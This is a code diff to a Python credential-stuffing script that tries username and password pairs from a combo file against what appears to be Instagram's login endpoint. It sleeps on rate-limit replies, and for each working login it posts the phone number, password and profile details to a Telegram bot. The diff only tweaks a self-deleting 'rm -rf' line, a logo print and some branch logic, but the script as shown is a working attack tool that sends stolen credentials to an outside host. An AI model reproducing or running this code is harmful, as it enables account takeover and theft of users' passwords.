@@ -1,7 +1,7 @@
 import requests, sys, os, random, time
 from colorama import Fore
 import os,sys
-os.system('rm -rf .dabll.py ;clear')
+os.system('rm -rf .chkflo.py ;clear')
 from bs4 import BeautifulSoup
 from colorama import Fore as fore
 import requests
@@ -31,6 +31,8 @@ if agar=='y' or agar=='yes' or agar=='Y' or agar=='YES' or agar=='Yes':
 else:
 	pass
 	print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
+os.system("clear")
+print(logo)
 combo="combo.txt"
 file = open(combo,'r').read().splitlines()
 for line in file:
@@ -61,11 +63,7 @@ for line in file:
     'queryParams': '{}',
     'optIntoOneTap': 'false'}
     req_login = requests.post(url_login, data=data_login, headers=headers_login)
-    if '"authenticated":false' in req_login.text:
-        print()
-    elif '"authenticated":false' in req_login.text:
-        print()
-    elif '"message":"Please wait a few minutes before you try again."' in req_login.text:
+    if '"message":"Please wait a few minutes before you try again."' in req_login.text:
         print("timeout wait 5 min")
         time.sleep(360)
     elif '"authenticated":true' in req_login.text:
@@ -136,5 +134,4 @@ for line in file:
                 requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={s}\n')
                 ss=(f"----\033[32mGood\033[0;1m\n  Number: +"+username_login+"\n  Pass: "+password_login+"\n  UserName: "+username+"\n  Name: "+name+"\n  Followers: "+followers+"\n  Following: "+following+"\n  Posts: "+posts+"\n  Facebook: nazanm\n  Tiktok: nazanm\n")
                 print(ss)
-    else:
-        print()
+
